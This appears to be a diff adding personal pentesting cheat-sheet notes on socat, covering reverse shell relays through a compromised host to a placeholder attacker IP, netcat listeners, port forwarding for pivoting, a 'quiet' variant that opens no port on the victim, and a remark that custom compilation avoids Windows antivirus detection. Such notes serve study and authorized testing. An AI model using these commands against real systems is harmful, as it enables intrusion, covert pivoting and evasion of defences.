@@ -1,0 +1,28 @@
+- socat : 
+    - description : use to connect two things
+    - cons : 
+        - detected by antiviruses on windows with the default binary so need customization compilation
+        - not installed on any system by default
+        - hard syntax
+    - use case : 
+        - reverse/bind shell
+        - port forwarding
+        - relay
+    - syntax : 
+        - reverse shell relay : 
+            - commands :
+                - creating relay : socat tcp-l:LOCAL_PORT tcp:ATTACKING_IP:ATTACKER_PORT &
+                - creating listner on the LOCAL_PORT on the compromized host : nc -nlvp LOCAL_PORT
+                - creating a listner on the attacking machine : nc -nlvp ATTACKER_PORT
+        - port forwarding : 
+            - easy : 
+                - command : socat tcp-l:LOCAL_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT &
+                - description : this redirect all trafic to TARGET_IP:TARGET_PORT through LOCAL_PORT on the compromized host
+                - fork, and reuseaddr : allow to use the same port forward multiple time
+            - quiet : 
+                - commands : 
+                    - on the attacking machine : socat tcp-l:SECOND_PORT tcp-l:FIRST_PORT,fork,reuseaddr &
+                    - on the compromized host : socat tcp:ATTACKING_IP:SECOND_PORT tcp:TARGET_IP:TARGET_PORT,fork &
+                - description : 
+                    - this create a port forwarding without opening any port on the compromized machine
+                    - this link the TARGET_IP:TARGET_PORT to localhost:FIRST_PORT
